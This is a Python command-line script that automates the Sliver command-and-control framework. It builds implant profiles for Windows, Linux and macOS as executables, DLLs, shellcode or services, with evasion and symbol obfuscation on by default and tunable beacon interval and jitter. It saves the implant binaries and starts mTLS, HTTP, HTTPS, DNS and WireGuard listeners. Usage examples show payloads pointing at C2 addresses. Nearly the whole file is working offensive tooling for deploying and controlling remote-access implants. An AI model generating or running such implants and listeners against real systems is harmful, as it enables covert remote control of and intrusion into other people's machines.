#!/usr/bin/env python3
"""
Sliver Implant Generator
Generate Sliver implants programmatically via the API
Based on working IPython implementation
"""

import asyncio
import argparse
import sys
from pathlib import Path
from sliver import SliverClientConfig, SliverClient
from sliver.pb.clientpb.client_pb2 import ImplantProfile, OutputFormat


async def create_and_generate_implant(
    client,
    profile_name,
    c2_url,
    os="windows",
    arch="amd64",
    beacon=False,
    beacon_interval=60,
    beacon_jitter=30,
    evasion=True,
    obfuscate=True,
    format_type="exe",
    save_as=None
):
    """
    Create a fresh implant profile and generate an implant from it.
    
    Args:
        client: Connected SliverClient instance
        profile_name: Name for the profile
        c2_url: C2 URL (e.g., "mtls://10.0.0.1:8888")
        os: Target OS (windows/linux/darwin)
        arch: Target architecture (amd64/386/arm64)
        beacon: Use beacon mode instead of session
        beacon_interval: Beacon interval in seconds
        beacon_jitter: Beacon jitter percentage
        evasion: Enable evasion
        obfuscate: Obfuscate symbols
        format_type: Output format (exe/shared/shellcode/service)
        save_as: Optional filename
    """
    
    profile = ImplantProfile()
    profile.Name = profile_name
    
    # Basic config
    profile.Config.GOOS = os
    profile.Config.GOARCH = arch
    
    # Set output format
    format_map = {
        "exe": OutputFormat.EXECUTABLE,
        "shared": OutputFormat.SHARED_LIB,
        "shellcode": OutputFormat.SHELLCODE,
        "service": OutputFormat.SERVICE,
    }
    profile.Config.Format = format_map.get(format_type, OutputFormat.EXECUTABLE)
    
    profile.Config.Evasion = evasion
    profile.Config.ObfuscateSymbols = obfuscate
    profile.Config.TemplateName = "sliver"
    
    # CRITICAL: Set HTTPC2ConfigName to avoid "record not found"
    profile.Config.HTTPC2ConfigName = "default"
    
    # WireGuard defaults
    profile.Config.WGPeerTunIP = "<nil>"
    profile.Config.WGKeyExchangePort = 1337
    profile.Config.WGTcpCommsPort = 8888
    
    # Timing
    profile.Config.ReconnectInterval = 60000000000
    profile.Config.MaxConnectionErrors = 1000
    profile.Config.PollTimeout = 360000000000
    
    # Beacon settings
    profile.Config.IsBeacon = beacon
    if beacon:
        profile.Config.BeaconInterval = beacon_interval * 1000000000  # Convert to ns
        profile.Config.BeaconJitter = beacon_jitter
    
    # Determine C2 protocol
    c2_lower = c2_url.lower()
    if c2_lower.startswith("mtls://"):
        profile.Config.IncludeMTLS = True
    elif c2_lower.startswith("http://") or c2_lower.startswith("https://"):
        profile.Config.IncludeHTTP = True
    elif c2_lower.startswith("wg://"):
        profile.Config.IncludeWG = True
    elif c2_lower.startswith("dns://"):
        profile.Config.IncludeDNS = True
    
    # C2 config
    c2 = profile.Config.C2.add()
    c2.URL = c2_url
    
    print(f"[*] Creating profile '{profile_name}'...")
    print(f"[*] Config: {os}/{arch}, Format: {format_type}, Mode: {'beacon' if beacon else 'session'}")
    
    # Save profile
    saved = await client.save_implant_profile(profile, timeout=60)
    print(f"[+] Profile saved: {saved.Name} (ID: {saved.Config.ID})")
    
    # Generate implant
    print(f"[*] Generating implant (this may take a few minutes)...")
    result = await client.generate_implant(saved.Config, timeout=600)
    print(f"[+] Generated: {result.File.Name} ({len(result.File.Data):,} bytes)")
    
    # Save file
    filename = save_as or result.File.Name
    with open(filename, 'wb') as f:
        f.write(result.File.Data)
    print(f"[+] Saved to: {filename}")
    
    return result


async def list_profiles(client):
    """List all saved implant profiles."""
    profiles = await client.implant_profiles()
    
    if not profiles:
        print("No profiles found")
        return
    
    print(f"\nFound {len(profiles)} profile(s):\n")
    for p in profiles:
        c2_urls = [c.URL for c in p.Config.C2] if p.Config.C2 else ["(none)"]
        mode = "Beacon" if p.Config.IsBeacon else "Session"
        
        print(f"  {p.Name}")
        print(f"    ID: {p.Config.ID}")
        print(f"    OS/Arch: {p.Config.GOOS}/{p.Config.GOARCH}")
        print(f"    Mode: {mode}")
        if p.Config.IsBeacon:
            print(f"    Interval: {p.Config.BeaconInterval // 1000000000}s (jitter: {p.Config.BeaconJitter}%)")
        print(f"    C2: {', '.join(c2_urls)}")
        print()


async def list_builds(client):
    """List all existing implant builds."""
    builds = await client.implant_builds()
    
    if not builds:
        print("No builds found")
        return
    
    print(f"\nFound {len(builds)} build(s):\n")
    for name, config in builds.items():
        c2_urls = [c.URL for c in config.C2] if config.C2 else ["(none)"]
        mode = "Beacon" if config.IsBeacon else "Session"
        
        print(f"  {name}")
        print(f"    ID: {config.ID}")
        print(f"    OS/Arch: {config.GOOS}/{config.GOARCH}")
        print(f"    Mode: {mode}")
        print(f"    C2: {', '.join(c2_urls)}")
        print()


async def start_listener(client, c2_url, host="0.0.0.0", port=None, domain="", website=""):
    """
    Start a listener based on the C2 URL protocol.

    Args:
        client: Connected SliverClient instance
        c2_url: C2 URL to derive protocol/port from (e.g., mtls://0.0.0.0:8888)
        host: Interface to bind (default: 0.0.0.0)
        port: Port override (defaults to protocol standard if omitted)
        domain: Domain name for HTTP/HTTPS listeners
        website: Website name to host on HTTP/HTTPS listener
    """
    from urllib.parse import urlparse

    parsed = urlparse(c2_url)
    scheme = parsed.scheme.lower()

    # Resolve port: CLI override > URL port > protocol default
    defaults = {"mtls": 8888, "http": 80, "https": 443, "dns": 53, "wg": 53}
    resolved_port = port or (parsed.port if parsed.port else defaults.get(scheme, 8888))
    resolved_host = host or parsed.hostname or "0.0.0.0"

    # Check if a listener is already running on this port/protocol
    # Note: Protocol is always "tcp" in Sliver Job proto; Name holds the actual type (mtls, http, etc.)
    existing_jobs = await client.jobs()
    for j in existing_jobs:
        if j.Port == resolved_port and j.Name.lower() == scheme:
            print(f"[!] {scheme.upper()} listener already running on port {resolved_port} (Job ID: {j.ID})")
            return None

    print(f"[*] Starting {scheme.upper()} listener on {resolved_host}:{resolved_port}...")

    if scheme == "mtls":
        job = await client.start_mtls_listener(host=resolved_host, port=resolved_port)

    elif scheme == "http":
        job = await client.start_http_listener(
            host=resolved_host,
            port=resolved_port,
            domain=domain,
            website=website,
        )

    elif scheme == "https":
        job = await client.start_https_listener(
            host=resolved_host,
            port=resolved_port,
            domain=domain,
            website=website,
        )

    elif scheme == "dns":
        if not domain:
            print("[!] DNS listener requires --domain", file=sys.stderr)
            sys.exit(1)
        job = await client.start_dns_listener(
            domains=[domain],
            host=resolved_host,
            port=resolved_port,
        )

    elif scheme == "wg":
        job = await client.start_wg_listener(host=resolved_host, port=resolved_port)

    else:
        print(f"[!] Unsupported protocol: {scheme}", file=sys.stderr)
        sys.exit(1)

    print(f"[+] Listener started — Job ID: {job.JobID}")
    return job


async def list_jobs(client):
    """List all running listener jobs."""
    jobs = await client.jobs()

    if not jobs:
        print("No active jobs")
        return

    print(f"\nFound {len(jobs)} active job(s):\n")
    for j in jobs:
        print(f"  Job {j.ID}  {j.Protocol.upper():6}  {j.Name}  port {j.Port}")
    print()


async def kill_job(client, job_id):
    """Kill a listener job by ID."""
    result = await client.kill_job(job_id)
    if result.Success:
        print(f"[+] Job {job_id} killed")
    else:
        print(f"[!] Failed to kill job {job_id}")


async def delete_profile(client, profile_name):
    """Delete an implant profile."""
    try:
        await client.delete_implant_profile(profile_name)
        print(f"[+] Deleted profile: {profile_name}")
    except Exception as e:
        print(f"[!] Failed to delete profile: {e}")


async def main():
    parser = argparse.ArgumentParser(
        description="Generate Sliver implants programmatically",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Generate a basic mTLS session implant
  %(prog)s generate --config ~/.sliver-client/configs/operator.cfg \\
      --name my_implant --c2 mtls://10.0.0.1:8888

  # Generate an HTTP beacon
  %(prog)s generate --config ~/.sliver-client/configs/operator.cfg \\
      --name http_beacon --c2 http://10.0.0.1:8080 \\
      --beacon --interval 30 --jitter 20 --output payload.exe

  # Generate a DLL
  %(prog)s generate --config ~/.sliver-client/configs/operator.cfg \\
      --name my_dll --c2 https://domain.com:443 \\
      --format shared --output payload.dll

  # List profiles
  %(prog)s list-profiles --config ~/.sliver-client/configs/operator.cfg

  # List builds
  %(prog)s list-builds --config ~/.sliver-client/configs/operator.cfg

  # Delete a profile
  %(prog)s delete-profile --config ~/.sliver-client/configs/operator.cfg \\
      --name old_profile

  # Start an mTLS listener
  %(prog)s start-listener --config ~/.sliver-client/configs/operator.cfg \\
      --c2 mtls://0.0.0.0:8888

  # Start an HTTP listener on a specific interface/port
  %(prog)s start-listener --config ~/.sliver-client/configs/operator.cfg \\
      --c2 http://0.0.0.0:8080 --domain example.com

  # Start an HTTPS listener
  %(prog)s start-listener --config ~/.sliver-client/configs/operator.cfg \\
      --c2 https://0.0.0.0:443 --domain example.com

  # Start a DNS listener
  %(prog)s start-listener --config ~/.sliver-client/configs/operator.cfg \\
      --c2 dns://0.0.0.0:53 --domain c2.example.com

  # List active listener jobs
  %(prog)s list-jobs --config ~/.sliver-client/configs/operator.cfg

  # Kill a listener job
  %(prog)s kill-job --config ~/.sliver-client/configs/operator.cfg --id 1
        """
    )
    
    subparsers = parser.add_subparsers(dest='command', help='Command to execute')
    
    # Generate command
    gen_parser = subparsers.add_parser('generate', help='Generate a new implant')
    gen_parser.add_argument('--config', required=True, help='Sliver client config file')
    gen_parser.add_argument('--name', required=True, help='Profile name')
    gen_parser.add_argument('--c2', required=True, help='C2 URL (e.g., mtls://10.0.0.1:8888)')
    gen_parser.add_argument('--os', default='windows', choices=['windows', 'linux', 'darwin'],
                           help='Target OS (default: windows)')
    gen_parser.add_argument('--arch', default='amd64', choices=['amd64', '386', 'arm64', 'arm'],
                           help='Target architecture (default: amd64)')
    gen_parser.add_argument('--format', default='exe', choices=['exe', 'shared', 'shellcode', 'service'],
                           help='Output format (default: exe)')
    gen_parser.add_argument('--beacon', action='store_true', help='Generate beacon instead of session')
    gen_parser.add_argument('--interval', type=int, default=60,
                           help='Beacon interval in seconds (default: 60)')
    gen_parser.add_argument('--jitter', type=int, default=30,
                           help='Beacon jitter percentage 0-100 (default: 30)')
    gen_parser.add_argument('--no-evasion', action='store_true', help='Disable evasion')
    gen_parser.add_argument('--no-obfuscate', action='store_true', help='Disable obfuscation')
    gen_parser.add_argument('--output', '-o', help='Output filename (default: auto-generated)')
    
    # List profiles command
    list_prof_parser = subparsers.add_parser('list-profiles', help='List all saved profiles')
    list_prof_parser.add_argument('--config', required=True, help='Sliver client config file')
    
    # List builds command
    list_builds_parser = subparsers.add_parser('list-builds', help='List all existing builds')
    list_builds_parser.add_argument('--config', required=True, help='Sliver client config file')
    
    # Delete profile command
    del_prof_parser = subparsers.add_parser('delete-profile', help='Delete a profile')
    del_prof_parser.add_argument('--config', required=True, help='Sliver client config file')
    del_prof_parser.add_argument('--name', required=True, help='Profile name to delete')

    # Start listener command
    listener_parser = subparsers.add_parser('start-listener', help='Start a C2 listener')
    listener_parser.add_argument('--config', required=True, help='Sliver client config file')
    listener_parser.add_argument('--c2', required=True,
                                 help='C2 URL to derive protocol/port (e.g., mtls://0.0.0.0:8888)')
    listener_parser.add_argument('--host', default='0.0.0.0',
                                 help='Interface to bind (default: 0.0.0.0)')
    listener_parser.add_argument('--port', type=int, default=None,
                                 help='Port override (default: derived from --c2 URL)')
    listener_parser.add_argument('--domain', default='',
                                 help='Domain for HTTP/HTTPS/DNS listeners')
    listener_parser.add_argument('--website', default='',
                                 help='Website name to host on HTTP/HTTPS listener')

    # List jobs command
    list_jobs_parser = subparsers.add_parser('list-jobs', help='List active listener jobs')
    list_jobs_parser.add_argument('--config', required=True, help='Sliver client config file')

    # Kill job command
    kill_job_parser = subparsers.add_parser('kill-job', help='Kill a listener job')
    kill_job_parser.add_argument('--config', required=True, help='Sliver client config file')
    kill_job_parser.add_argument('--id', type=int, required=True, help='Job ID to kill')
    
    args = parser.parse_args()
    
    if not args.command:
        parser.print_help()
        sys.exit(1)
    
    # Validate config file
    config_path = Path(args.config).expanduser()
    if not config_path.exists():
        print(f"[!] Error: Config file not found: {config_path}", file=sys.stderr)
        sys.exit(1)
    
    try:
        # Connect to Sliver
        print(f"[*] Connecting to Sliver server...")
        config = SliverClientConfig.parse_config_file(str(config_path))
        client = SliverClient(config)
        await client.connect()
        
        # Get server version
        version = await client.version()
        print(f"[+] Connected to Sliver server v{version.Major}.{version.Minor}.{version.Patch}")
        
        # Execute command
        if args.command == 'generate':
            await create_and_generate_implant(
                client=client,
                profile_name=args.name,
                c2_url=args.c2,
                os=args.os,
                arch=args.arch,
                beacon=args.beacon,
                beacon_interval=args.interval,
                beacon_jitter=args.jitter,
                evasion=not args.no_evasion,
                obfuscate=not args.no_obfuscate,
                format_type=args.format,
                save_as=args.output
            )
            print(f"\n[+] Done!")
            
        elif args.command == 'list-profiles':
            await list_profiles(client)
            
        elif args.command == 'list-builds':
            await list_builds(client)
            
        elif args.command == 'delete-profile':
            await delete_profile(client, args.name)

        elif args.command == 'start-listener':
            await start_listener(
                client=client,
                c2_url=args.c2,
                host=args.host,
                port=args.port,
                domain=args.domain,
                website=args.website,
            )

        elif args.command == 'list-jobs':
            await list_jobs(client)

        elif args.command == 'kill-job':
            await kill_job(client, args.id)
    
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        sys.exit(1)


if __name__ == "__main__":
    asyncio.run(main())
